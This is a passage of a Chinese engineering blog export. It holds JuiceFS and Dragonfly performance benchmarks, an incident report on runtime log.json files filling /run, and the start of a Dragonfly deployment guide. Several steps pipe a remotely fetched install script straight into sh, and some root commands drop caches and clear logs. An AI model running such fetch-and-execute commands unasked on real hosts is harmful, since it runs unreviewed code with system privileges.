export BUCKET_ENPOINT=$BUCKET.$ENDPOINT 设置测试用例 ID 1 export TEST_CASE=xxx 本地网络测试状况 Dragonfly Peer 之间的带宽: 25 Gbps\nDragonfly Peer 到对象存储源站的带宽: 20 Gbps，在测试机器能打满\n解除 Dragonfly Peer 限速配置 1 2 perPeerRateLimit: 5120Mi totalRateLimit: 10240Mi 2. 本地磁盘 2.1 dd 读写测试 写文件, 速度 967 MB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 10.8478 s, 967 MB/s real\t0m11.625s user\t0m0.008s sys\t0m11.442s 首次读，1138 MB/s 1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t0m9.048s user\t0m0.021s sys\t0m4.431s 带缓存读，5120 MB/s 1 2 3 4 5 time cp ./dd.txt /dev/null real\t0m2.015s user\t0m0.004s sys\t0m2.009s 这里直接使用了内存缓存。\n2.2 benchmark 测试 1 2 3 4 5 6 7 8 9 10 11 juicefs bench --block-size 4096 --big-file-size 1024 --threads 30 ./ +------------------+------------------+--------------+ | ITEM | VALUE | COST | +------------------+------------------+--------------+ | Write big file | 2067.12 MiB/s | 14.86 s/file | | Read big file | 6295.55 MiB/s | 4.88 s/file | | Write small file | 12358.1 files/s | 2.43 ms/file | | Read small file | 17480.9 files/s | 1.72 ms/file | | Stat file | 192702.6 files/s | 0.16 ms/file | +------------------+------------------+--------------+ 2.3 fio 测试 安装 OpsCli 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 运行 1 opscli task -f ~/.ops/tasks/get-diskio-byfio.yaml --size 10g --filename=/data/test/${TEST_CASE}-fio.txt Test Type IOPS Bandwidth Duration Rand_Read_Testing 164k 639 MiB/s 16027 msec Rand_Write_Testing 46.7k 182 MiB/s 56175 msec Sequ_Read_Testing 7754 969 MiB/s 10564 msec Sequ_Write_Testing 5055 632 MiB/s 16203 msec 3. 社区版 JuiceFS 在使用时，应该都会带 Cache，这里就不验证不带 Cache 的情况了。\n3.1 挂载文件系统 创建文件系统 1 export REDIS_DIRECTSERVER=redis://${REDIS_USER}:${REDIS_PASSWORD}@${REDIS_IP}:${REDIS_PORT}/1 1 2 3 4 5 juicefs format \\ --storage ks3 \\ --bucket ${BUCKET_ENPOINT}\\ ${REDIS_DIRECTSERVER} \\ ${TEST_CASE}-direct 挂载文件系统 1 juicefs mount -d --buffer-size 2000 --max-uploads 150 ${REDIS_DIRECTSERVER} ./${TEST_CASE}-direct --cache-dir=/data/jfs-${TEST_CASE} 此时，在 ${TEST_CASE}-direct 目录下的操作，都会被同步到桶的 ${TEST_CASE}-direct 文件中。\n3.2 dd 读写测试 进入挂载目录 1 cd ${TEST_CASE}-direct 写文件，速度 640 MB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 16.3898 s, 640 MB/s real\t0m16.406s user\t0m0.008s sys\t0m8.233s 首次读，速度 84 MB/s 1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t2m2.601s user\t0m0.040s sys\t0m7.424s 带缓存读，速度 1765 MB/s 此时 JuiceFS 已经在本地缓存了数据。\n1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t0m5.824s user\t0m0.020s sys\t0m5.684s 3.3 benchmark 测试 1 2 3 4 5 6 7 8 9 10 11 juicefs bench --block-size 4096 --big-file-size 1024 --threads 30 ./ +------------------+----------------+---------------+ | ITEM | VALUE | COST | +------------------+----------------+---------------+ | Write big file | 560.37 MiB/s | 36.55 s/file | | Read big file | 1353.06 MiB/s | 15.14 s/file | | Write small file | 238.0 files/s | 84.02 ms/file | | Read small file | 11527.3 files/s | 1.74 ms/file | | Stat file | 24699.4 files/s | 0.81 ms/file | +------------------+----------------+---------------+ 通过不断增加 threads，可以得到更好的性能数据，打满对象存储后端的带宽。我在 threads 维度测试了多组数据\nThreads Operation Write Speed (MiB/s) Write Time (s/file) Read Speed (MiB/s) Read Time (s/file) 20 Write big file 1491.96 13.73 1776.85 11.53 30 Write big file 1610.24 19.08 2136.94 14.38 40 Write big file 1689.97 24.24 2803.49 14.61 50 Write big file 1714.95 29.86 3200.11 16.00 其他测试用例，选择了 threads = 30 作为统一的测试参数。\n3.4 fio 测试 安装 OpsCli 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 运行 1 opscli task -f ~/.ops/tasks/get-diskio-byfio.yaml --size 10g --filename=/data/test/${TEST_CASE}-direct/fio.txt Test Type IOPS Bandwidth Duration Rand_Read_Testing 159k 621 MiB/s 16486 msec Rand_Write_Testing 47.7k 187 MiB/s 54906 msec Sequ_Read_Testing 8189 1024 MiB/s 10003 msec Sequ_Write_Testing 5182 648 MiB/s 15806 msec 3.5 卸载文件系统 1 2 cd .. juicefs umount ./${TEST_CASE}-direct 4. 企业版 JuiceFS 4.1 挂载 挂载企业版 JuiceFS 需要去控制台获取挂载命令，如下图:\n执行挂载命令之后，还需要输入 Bucket 的 AccessKey 和 SecretKey。企业版的 JuiceFS 只是负责存储元数据，数据还是存储在对象存储中。\n4.2 dd 读写测试 进入挂载目录 1 cd /jfs 写文件，速度 645 MB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 16.2446 s, 645 MB/s real\t0m16.294s user\t0m0.012s sys\t0m8.963s 首次读，速度 853 MB/s 1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t0m12.947s user\t0m0.036s sys\t0m7.715s 带缓存读，速度 1024 MB/s 1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t0m1.969s user\t0m0.020s sys\t0m1.927s 4.3 benchmark 测试 1 2 3 4 5 6 7 8 9 10 11 juicefs bench --block-size 4096 --big-file-size 1024 --threads 30 ./ +------------------+------------------+----------------+ | ITEM | VALUE | COST | +------------------+------------------+----------------+ | Write big file | 349.72 MiB/s | 87.84 s/file | | Read big file | 710.07 MiB/s | 43.26 s/file | | Write small file | 41.7 files/s | 719.14 ms/file | | Read small file | 672.3 files/s | 44.62 ms/file | | Stat file | 162303.2 files/s | 0.18 ms/file | +------------------+-----------------+---------------+ 4.4 fio 测试 安装 OpsCli 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 运行 1 opscli task -f ~/.ops/tasks/get-diskio-byfio.yaml --size 10g --filename=/jfs/${TEST_CASE}-ee/fio.txt Test Type IOPS Bandwidth Duration Rand_Read_Testing 147k 573 MiB/s 17864 msec Rand_Write_Testing 45.0k 176 MiB/s 58244 msec Sequ_Read_Testing 7565 946 MiB/s 10828 msec Sequ_Write_Testing 5182 648 MiB/s 15806 msec 5. Dragonfly + 社区版 JuiceFS 默认安装的 JuiceFS 客户端是 Lite 版本，不支持 Dragonfly，需要自行编译最新的客户端。在 https://github.com/juicedata/juicefs/pull/4057 之后的版本中，已经支持了 Dragonfly dfstore 对象存储加速的方式，但 PR https://github.com/juicedata/juicefs/pull/4302 采用的是与镜像同路的代理方式，可以无需修改 manager 的情况下，配置多个 Bucket 进行加速。本节的 client 就是来自此 PR。\n5.1 配置 Dragonfly 在 Seed Peer 和 Peer 中添加如下配置:\n1 2 3 4 5 proxies: - regx: s3.*amazonaws.com.* - regx: oss.*aliyuncs.com.* - regx: obs.*myhuaweicloud.com.* - regx: ks3.*ksyun.com.* 5.2 挂载 创建文件系统 1 export REDIS_DRAGONFLY=redis://${REDIS_USER}:${REDIS_PASSWORD}@${REDIS_IP}:${REDIS_PORT}/2 1 2 3 4 5 juicefs format \\ ${REDIS_DRAGONFLY} \\ ${TEST_CASE}-df \\ --storage dragonfly \\ --bucket \u0026#34;https://${BUCKET_ENPOINT}?proxy=http://127.0.0.1:65001\u0026amp;backendStorage=s3\u0026#34; 在 Kubernetes 集群中，可以在每个节点运行一个代理，也可以在若干缓存节点部署代理，提供区域化加速的能力。\n挂载文件系统 1 juicefs mount ${REDIS_DRAGONFLY} ./${TEST_CASE}-df --cache-dir=/data/jfs-${TEST_CASE}-df -d 这里也不验证不带 Local Cache 的情况了。\n5.3 dd 读写测试 进入挂载目录 1 cd ${TEST_CASE}-df 写文件，速度 382 MB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 27.422 s, 382 MB/s real\t0m27.434s user\t0m0.012s sys\t0m9.840s 首次读，速度 31 MB/s 1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t5m21.089s user\t0m0.044s sys\t0m8.175s 带缓存读，1463 MB/s 速度 1 2 3 4 5 6 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches time cp ./dd.txt /dev/null real\t0m7.077s user\t0m0.048s sys\t0m6.928s 此时的缓存既有 JuiceFS 本地缓存，也有 Dragonfly 的缓存。\n5.4 benchmark 1 2 3 4 5 6 7 8 9 10 11 juicefs bench --block-size 4096 --big-file-size 1024 --threads 30 ./ +------------------+----------------+---------------+ | ITEM | VALUE | COST | +------------------+----------------+---------------+ | Write big file | 355.03 MiB/s | 86.53 s/file | | Read big file | 110.07 MiB/s | 279.09 s/file | | Write small file | 347.1 files/s | 86.43 ms/file | | Read small file | 14406.9 files/s | 2.08 ms/file | | Stat file | 40294.0 files/s | 0.74 ms/file | +------------------+-----------------+---------------+ 此时 /data/dfget/data/ 目录下已经有 39G 的文件了。\n5.5 fio 测试 安装 OpsCli 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 运行 1 opscli task -f ~/.ops/tasks/get-diskio-byfio.yaml --size 10g --filename=/data/test/${TEST_CASE}-df/fio.txt Test Type IOPS Bandwidth Duration Rand_Read_Testing 152k 592 MiB/s 17293 msec Rand_Write_Testing 48.0k 187 MiB/s 54625 msec Sequ_Read_Testing 8225 1028 MiB/s 9959 msec Sequ_Write_Testing 5171 646 MiB/s 15840 msec 6. 总结 6.1 dd bs=4M count=2500\n测试环境 本地磁盘 社区版 JuiceFS 企业版 JuiceFS 社区版 JuiceFS + Dragonfly 写速度 967 MB/s 640 MB/s 645 MB/s 382 MB/s 首次读速度 1138 MB/s 84 MB/s 853 MB/s 31 MB/s 缓存读速度 5120 MB/s 1765 MB/s 1024 MB/s 1463 MB/s 企业版的 JuiceFS 首次读速度非常快，远超社区版 JuiceFS 在没有缓存命中的情况下，Dragonfly 对社区版 JuiceFS 有明显减速效果，因为 Dragonfly 对文件切分、做种有开销 在缓存命中的情况下，社区版 JuiceFS 的缓存读取速度也非常快 6.2 benchmark \u0026ndash;block-size 4096 \u0026ndash;big-file-size 1024 \u0026ndash;threads 30\n项/环境 本地磁盘 社区版 JuiceFS 企业版 JuiceFS 社区版+Dragonfly 写大文件速度 2067 MiB/s 560 MiB/s 350 MiB/s 355 MiB/s 读大文件速度 6295 MiB/s 1353 MiB/s 710 MiB/s 110 MiB/s 写小文件 IOPS 12358 238 42 347 读小文件 IOPS 17480 11527 672 14406 Stat 文件 IOPS 192703 24699 162303 40294 Dragonfly 可以大幅提高社区版 JuiceFS 的小文件读写性能，Dragonfly 对小文件有优化处理 Dragonfly 对社区版 JuiceFS 读取大文件有明显减速效果 企业版 JuiceFS 相较于社区版 JuiceFS，有明显的全方面加速 6.3 fio 10G 文件\n测试项/环境 本地磁盘 社区版 JuiceFS 企业版 JuiceFS 社区版+Dragonfly 随机读 IOPS 164k 159k 147k 152k 随机读带宽 639 MiB/s 621 MiB/s 573 MiB/s 592 MiB/s 随机写 IOPS 46.7k 47.7k 45k 48k 随机写带宽 182 MiB/s 187 MiB/s 176 MiB/s 187 MiB/s 顺序读 IOPS 7.8k 8.2k 7.6k 8.2k 顺序读带宽 969 MiB/s 1 GB/s 946 MiB/s 1 GB/s 顺序写 IOPS 5.1k 5.2k 5.2k 5.2k 顺序写带宽 632 MiB/s 648 MiB/s 648 MiB/s 646 MiB/s fio 的结果显示，各种情况的差异不大。\n6.4 一些思考和建议 关于企业版的 JuiceFS 企业版的 JuiceFS 只是负责存储元数据，类似社区版需要使用 MySQL、Redis 存储元数据一样。但 JuiceFS EE 的部署节点，提供有缓存加速的能力。另外一点是企业级存储软件提供服务质量兜底。\nDragonfly + 社区版 JuiceFS 的性能测试结果 上面的测试是基于单机，而 Dragonfly 的优势在于大规模 P2P 组网的加速能力。因此，并不需要简单从性能角度做出选择，而是应该考虑到源站带宽、数据规模等因素。\n同时，从上面的结果可以看出，在读文件时，如果命中缓存，Dragonfly + 社区版 JuiceFS 能媲美企业版 JuiceFS。\n社区版 JuiceFS 是否应该上 Dragonfly 主要需要根据服务访问对象存储源站的带宽判断。\n如果服务访问对象存储源站的带宽足够，那么直接使用社区版 JuiceFS 就行。如果服务访问对象存储源站的带宽不稳定、不够，那么就需要着重考虑缓存加速服务，再来根据具体情况选择企业版 JuiceFS 或 Dragonfly + 社区版 JuiceFS。下面是一个供参考的决策图:\n供参考的部署架构 在选择采用哪种方式时，主要考虑的是成本、性能、质量，结合业务的现状、体量做出选择。下面给出两张示意图，以供参考:\n","description":"","id":75,"section":"post","tags":["博文","JuiceFS","Go","Python3"],"title":"JuiceFS 社区版、企业版、Dragonfly 集成性能测试及对比","uri":"https://www.chenshaowen.com/blog/performance-testing-and-comparison-of-juicefs-ce-ee-and-dragonfly.html"},{"content":" 使用 nvidia-container-runtime 的朋友可以重点关注下，特别是还有 JuiceFS 的情况。\n1. 突然收到告警，我慌了 周末，学习 TensorRT LLM，顺便给线上最大的正式集群安装了一下 Dragonfly，然后就去买菜了。\n下午发现有个节点的 Dragonfly Daemon 没起来，一直告警，就去所在节点重启了下 Kubelet。\n大约 10 分钟之后，开始收到线上告警。\n1 2 3 4 5 6 7 8 日志分析告警 时间：2024-01-20 15:26:25 标题：过去20s 状态码503数量超过阈值 547 \u0026gt;= 3 详情： 前三失败接口: path: /api/xxx/v2/models/xxx/versions/1/infer\t数量: 237 path: /api/xxx/v2/models/xxx/versions/1/infer\t数量: 188 path: /api/xxx/v2/models/xxx/versions/1/infer\t数量: 122 而且不停告警，来 AI 部门不久，丹还没练出来，就碰到这事。我可是啥都没干，哼！\n还是先解决问题，看了眼 Kubelet 日志\n1 kubelet[4031671]: E0120 15:31:57.357711 4031671 remote_runtime.go:209] \u0026#34;RunPodSandbox from runtime service failed\u0026#34; err=\u0026#34;rpc error: code = Unknown desc = failed to start sandbox container for pod \\\u0026#34;dragonfly-dfdaemon-wznfl\\\u0026#34;: Error response from daemon: write /run/containerd/io.containerd.runtime.v2.task/moby/2b6a70e32f77707d88b73d28054bb83aed34d9ac90c0993df9d1209bd5402b84/config.json: no space left on device: unknown\u0026#34; 查看磁盘情况\n1 2 3 df -h tmpfs 51G 51G 0 100% /run 发现 /run 存储空间不够，于是就在 /run/containerd/io.containerd.runtime.v2.task/moby 目录下查看大文件\n1 2 3 4 5 6.3G\t/run/containerd/io.containerd.runtime.v2.task/moby/6be974f9293ab553bf86f0eda38b7813f315a98e63895eddaccb6b290ef6a1ac/log.json 6.3G\t/run/containerd/io.containerd.runtime.v2.task/moby/811c9a0aabb50f5ca73e6ee529f41745c2e18568a160f42314caaba142562c6b/log.json 7.9G\t/run/containerd/io.containerd.runtime.v2.task/moby/398ecf3c1488b4f8ec0f0ad12ac0a1080355fbd8102f6ed21980c7d7637ec7d2/log.json 8.1G\t/run/containerd/io.containerd.runtime.v2.task/moby/ab7253b7bbd05c8fe017008de2ec4494b4c11f2d55b980927d2fdcb3b306c924/log.json 9.6G\t/run/containerd/io.containerd.runtime.v2.task/moby/6030f2ad8532162cfa0effb479a9cd3f31c894c2152dfe34ddc59244b53f6241/log.json 破案了，直接清空这些文件内容，服务立马恢复了。\n2. 复现 log.json 日志增长现象 2.1 查看 log.json 并分析来源 先查看一下日志内容\n1 {\u0026#34;level\u0026#34;:\u0026#34;info\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Running with config:\\n{\\n \\\u0026#34;AcceptEnvvarUnprivileged\\\u0026#34;: true,\\n \\\u0026#34;NVIDIAContainerCLIConfig\\\u0026#34;: {\\n \\\u0026#34;Root\\\u0026#34;: \\\u0026#34;\\\u0026#34;\\n },\\n \\\u0026#34;NVIDIACTKConfig\\\u0026#34;: {\\n \\\u0026#34;Path\\\u0026#34;: \\\u0026#34;nvidia-ctk\\\u0026#34;\\n },\\n \\\u0026#34;NVIDIAContainerRuntimeConfig\\\u0026#34;: {\\n \\\u0026#34;DebugFilePath\\\u0026#34;: \\\u0026#34;/dev/null\\\u0026#34;,\\n \\\u0026#34;LogLevel\\\u0026#34;: \\\u0026#34;info\\\u0026#34;,\\n \\\u0026#34;Runtimes\\\u0026#34;: [\\n \\\u0026#34;docker-runc\\\u0026#34;,\\n \\\u0026#34;runc\\\u0026#34;\\n ],\\n \\\u0026#34;Mode\\\u0026#34;: \\\u0026#34;auto\\\u0026#34;,\\n \\\u0026#34;Modes\\\u0026#34;: {\\n \\\u0026#34;CSV\\\u0026#34;: {\\n \\\u0026#34;MountSpecPath\\\u0026#34;: \\\u0026#34;/etc/nvidia-container-runtime/host-files-for-container.d\\\u0026#34;\\n },\\n \\\u0026#34;CDI\\\u0026#34;: {\\n \\\u0026#34;SpecDirs\\\u0026#34;: null,\\n \\\u0026#34;DefaultKind\\\u0026#34;: \\\u0026#34;nvidia.com/gpu\\\u0026#34;,\\n \\\u0026#34;AnnotationPrefixes\\\u0026#34;: [\\n \\\u0026#34;cdi.k8s.io/\\\u0026#34;\\n ]\\n }\\n }\\n },\\n \\\u0026#34;NVIDIAContainerRuntimeHookConfig\\\u0026#34;: {\\n \\\u0026#34;Path\\\u0026#34;: \\\u0026#34;/usr/bin/nvidia-container-runtime-hook\\\u0026#34;,\\n \\\u0026#34;SkipModeDetection\\\u0026#34;: false\\n }\\n}\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2024-01-23T09:43:36+08:00\u0026#34;} 看起来不像是应用的日志，实际上也不是，而是 runc 的日志，准确点来说是 nvidia-container-runtime 的日志。\n而这里的 info 日志级别应该在 nvidia-container-runtime 的配置文件中可修改，移除掉 info 级别的日志即可。\n但这个问题是否仅存在于 nvidia-container-runtime 呢？不，这是一个被忽略的普遍问题。\n2.2 构造一个测试负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cat \u0026lt;\u0026lt; EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: demo-whomai spec: replicas: 1 selector: matchLabels: app: demo-whomai template: metadata: labels: app: demo-whomai spec: containers: - name: whomai image: shaowenchen/demo-whomai:latest readinessProbe: exec: command: - sh - -c - \u0026#39;[ -e /random/ ]\u0026#39; initialDelaySeconds: 1 periodSeconds: 1 EOF 经过反复地测试，我构造了上面这个负载。只需要注意两点即可触发 log.json 日志文件不断增长。\n配置探针 探针命令要执行错误 shaowenchen/demo-whomai:latest 镜像中执行 sh 会报错。按照每秒探测一次，积累两个月的 log.json 文件能达到几个 GB 大小。\n2.3 创建负载测试 创建负载 根据上面的 yaml 创建一个负载\n查看负载 1 2 3 4 kubectl get pod -l app=demo-whomai NAME READY STATUS RESTARTS AGE demo-whomai-966dd7875-jvvzr 0/1 Running 0 48m 由于健康检查未通过，Pod 不会处于 Ready 状态。\n查找容器 ID 1 CONTAINER_ID=$(kubectl get pod -l app=demo-whomai -ojson | jq -r \u0026#39;.items[0].status.containerStatuses[0].containerID | sub(\u0026#34;docker://\u0026#34;; \u0026#34;\u0026#34;)\u0026#39;) 查看容器的 log.json 文件 如果是 Docker 应该是 moby 命名空间下，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ls -alh /run/containerd/io.containerd.runtime.v2.task/moby/$CONTAINER_ID total 1.4M drwx------ 3 root root 240 Jan 23 10:40 . drwx--x--x 162 root root 3.2K Jan 23 11:29 .. -rw-rw-rw- 1 root root 89 Jan 23 10:40 address -rw-r--r-- 1 root root 9.5K Jan 23 10:40 config.json -rw-r--r-- 1 root root 7 Jan 23 10:40 init.pid prwx------ 1 root root 0 Jan 23 10:40 log -rw-r--r-- 1 root root 1.4M Jan 23 11:31 log.json -rw------- 1 root root 23 Jan 23 10:40 options.json drwxr-xr-x 1 root root 4.0K Jan 23 10:40 rootfs -rw------- 1 root root 0 Jan 23 10:40 runtime -rw------- 1 root root 32 Jan 23 10:40 shim-binary-path lrwxrwxrwx 1 root root 118 Jan 23 10:40 work -\u0026gt; /data/containerd/io.containerd.runtime.v2.task/k8s.io/240ccf68446af4a761273e5db08f6aebc362715f64d51efea785c26900c569c5 如果是 Containerd 应该是 k8s.io 命名空间下，ls -alh /run/containerd/io.containerd.runtime.v2.task/k8s.io/$CONTAINER_ID\n查看容器的 log.json 文件内容 如果是 Docker 应该是 moby 命名空间下，\n1 2 3 4 5 cat /run/containerd/io.containerd.runtime.v2.task/moby/$CONTAINER_ID/log.json {\u0026#34;level\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;exec failed: unable to start container process: exec: \\\u0026#34;sh\\\u0026#34;: executable file not found in $PATH\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2024-01-23T11:32:01+08:00\u0026#34;} {\u0026#34;level\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;exec failed: unable to start container process: exec: \\\u0026#34;sh\\\u0026#34;: executable file not found in $PATH\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2024-01-23T11:32:01+08:00\u0026#34;} {\u0026#34;level\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;exec failed: unable to start container process: exec: \\\u0026#34;sh\\\u0026#34;: executable file not found in $PATH\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2024-01-23T11:32:01+08:00\u0026#34;} 如果是 Containerd 应该是 k8s.io 命名空间下，cat /run/containerd/io.containerd.runtime.v2.task/k8s.io/$CONTAINER_ID/log.json\n3. 解决方案 3.1 直接清理 安装 Opscli 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 如果已经安装，需要执行 opscli upgrade 命令升级一下。\n查看超过 100M 的 log.json 文件 Docker 使用命令:\n1 opscli task -f ~/.ops/tasks/clear-biglog.yaml --logpath /run/containerd/io.containerd.runtime.v2.task/moby/ --logname \u0026#34;log.json\u0026#34; --size 100M -i ~/.kube/config --all Containerd 使用命令:\n1 opscli task -f ~/.ops/tasks/clear-biglog.yaml --logpath /run/containerd/io.containerd.runtime.v2.task/k8s.io/ --logname \u0026#34;log.json\u0026#34; --size 100M -i ~/.kube/config --all 清理超过 100M 的 log.json 文件 在查看命令的基础上，增加 --clear 参数，即可直接清理超过 100M 的 log.json 文件。\n3.2 修改 nvidia-container-runtime 的日志级别 编辑 nvidia-container-runtime 的配置文件\n1 2 3 4 vim /etc/nvidia-container-runtime/config.toml [nvidia-container-runtime] log-level = \u0026#34;info\u0026#34; 将 log-level = \u0026quot;info\u0026quot; 修改为 log-level = \u0026quot;error\u0026quot; 可以避免输出，类似 {\u0026quot;level\u0026quot;:\u0026quot;info\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;Running with config:\\n{\\n \\\u0026quot;AcceptEnvvarUnprivileged\\\u0026quot;: true,\\n \\\u0026quot;NVIDIAContainerCLIConfig\\\u0026quot;: {\\n \\\u0026quot;Root\\\u0026quot;: \\\u0026quot;\\\u0026quot;\\n },\\n \\\u0026quot;NVIDIACTKConfig\\\u0026quot;: {\\n \\\u0026quot;Path\\\u0026quot;: \\\u0026quot;nvidia-ctk\\\u0026quot;\\n },\\n \\\u0026quot;NVIDIAContainerRuntimeConfig\\\u0026quot;: {\\n \\\u0026quot;DebugFilePath\\\u0026quot;: \\\u0026quot;/dev/null\\\u0026quot;,\\n \\\u0026quot;LogLevel\\\u0026quot;: \\\u0026quot;info\\\u0026quot;,\\n \\\u0026quot;Runtimes\\\u0026quot;: [\\n \\\u0026quot;docker-runc\\\u0026quot;,\\n \\\u0026quot;runc\\\u0026quot;\\n ],\\n \\\u0026quot;Mode\\\u0026quot;: \\\u0026quot;auto\\\u0026quot;,\\n \\\u0026quot;Modes\\\u0026quot;: {\\n \\\u0026quot;CSV\\\u0026quot;: {\\n \\\u0026quot;MountSpecPath\\\u0026quot;: \\\u0026quot;/etc/nvidia-container-runtime/host-files-for-container.d\\\u0026quot;\\n },\\n \\\u0026quot;CDI\\\u0026quot;: {\\n \\\u0026quot;SpecDirs\\\u0026quot;: null,\\n \\\u0026quot;DefaultKind\\\u0026quot;: \\\u0026quot;nvidia.com/gpu\\\u0026quot;,\\n \\\u0026quot;AnnotationPrefixes\\\u0026quot;: [\\n \\\u0026quot;cdi.k8s.io/\\\u0026quot;\\n ]\\n }\\n }\\n },\\n \\\u0026quot;NVIDIAContainerRuntimeHookConfig\\\u0026quot;: {\\n \\\u0026quot;Path\\\u0026quot;: \\\u0026quot;/usr/bin/nvidia-container-runtime-hook\\\u0026quot;,\\n \\\u0026quot;SkipModeDetection\\\u0026quot;: false\\n }\\n}\u0026quot;,\u0026quot;time\u0026quot;:\u0026quot;2024-01-23T09:43:36+08:00\u0026quot;} 的日志。\n这个日志在 Docker 和 Containerd 的 io.containerd.runtime.v2 下会出现，在 io.containerd.runtime.v1 下反而没有。\n3.3 修改 Containerd 的 state 目录 1 2 3 vim /etc/containerd/config.toml state = \u0026#34;/run/containerd\u0026#34; 将 state = \u0026quot;/run/containerd\u0026quot; 修改为 state = \u0026quot;/data/containerd\u0026quot;，并且将 /data 目录挂载到额外的大磁盘上，这样即使 log.json 文件很大也不容易占满存储空间。\n4. 参考 https://forums.unraid.net/topic/141083-nvidia-driver-filling-up-logs/ ","description":"","id":76,"section":"post","tags":["博文","NVIDIA","JuiceFS","经验","事故"],"title":"Pod 的健康检查耗尽 /run 存储空间，差点卷铺盖走人","uri":"https://www.chenshaowen.com/blog/health-check-runs-out-of-root-run-storage.html"},{"content":"1. Dragonfly 简介 Dragonfly 的相关文档在社区 https://d7y.io/zh/docs/ 已经有详细说明。这里只是简单介绍一下，V2 版本的主要组件：\nManager，提供 UI 界面、用户管理、集群监控、任务管理等功能 Scheduler，调度 Peer 之间的流量、提供预热等功能 Seed Peer，回源节点，用于从源站（Harbor、Docker.io 等）下载数据，也可以作为 Peer 节点 Peer，提供下载数据的终端节点 其中 Manager、Scheduler 是单独的容器镜像，Seed Peer 和 Peer 是同一个容器镜像。\nDragonfly 支持的镜像预热功能，可以和 Harbor 进行集成，但本文不会涉及。本文主要是介绍我们在支撑 AI 业务时，生产环境下的一些实践。值得注意的是 Dragonfly V2 实际上构建了一个 P2P 分发的网络，不仅可以分发镜像，还可以分发文件，这就打开了想象空间。\n2. IDC 机房中的 Dragonfly 集群 我们 AI 模型的推理和训练都是基于 Kubernetes 集群，后端存储采用的是企业版 JuiceFS，在每个 Node 节点都挂载了几个 T 的 SSD 磁盘，用来挂载 JuiceFS 的缓存目录。\n因此，Kubernetes 集群中的每个 Node 节点都具备作为 Dragonfly Peer 节点的条件。但 Peer 组网时，我们不希望有额外的负担，包括:\n跨 VPC 的 NAT 流量 公网传输数据 下面是 Dragonflyv2 机房多 VPC 部署拓扑图：\nLB 需要公网 IP，作为 Peer 的接入点 一个 VPC 对应一个 Dragonfly 的 Cluster 抽象 虽然 IDC 打通了 VPC 之间的网络，但一个 VPC 内的 Peer 才允许组网 集群内每个 Node 节点部署一个 Peer VPC 内，下面这张图给出了详细的高可用方案。\nLB 只需要内网 IP 即可 使用云厂的 MySQL 8.0、Redis 6 服务 两台 VM 部署 Manager、Scheduler、Seed Peer 每个 VM 部署的是一套完整的 Dragonfly 集群，包括 Manager、Scheduler、Seed Peer，不用经过 LB 也能用 每个 Node 节点部署 Peer Dragonfly 构建的 P2P 分发网络，不应该和 PaaS 层耦合太紧密，避免循环依赖。因此，这里采用双 VM 的方案，共享数据存储，保障可用性。在 Kubernetes 集群的 Master 节点上，我们也不会进行加速优化，保障 PaaS 层控制面的简洁和独立。\n3. VM 上部署 Dragonfly 控制平面 需要提前安装好 Docker，分别在两台 VM 上进行独立部署。\n3.1 安装 docker-compose 下载 docker-compose 1 curl -L https://ghproxy.chenshaowen.com/https://github.com/docker/compose/releases/download/v2.23.3/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose 添加执行权限 1 chmod +x /usr/local/bin/docker-compose 查看版本 1 docker-compose -v 3.2 安装 dragonfly 参考 https://d7y.io/zh/docs/getting-started/quick-start/docker-compose/\n下载 docker-compose 部署文件 1 2 3 4 cd /data wget https://ghproxy.chenshaowen.com/https://github.com/dragonflyoss/Dragonfly2/archive/refs/tags/v2.1.28.tar.gz tar -zxvf v2.1.28.tar.gz cp -r Dragonfly2-2.1.28/deploy/docker-compose ./ 清理不需要的文件 1 rm -rf *2.1.28* 生成默认的配置文件 1 cd docker-compose 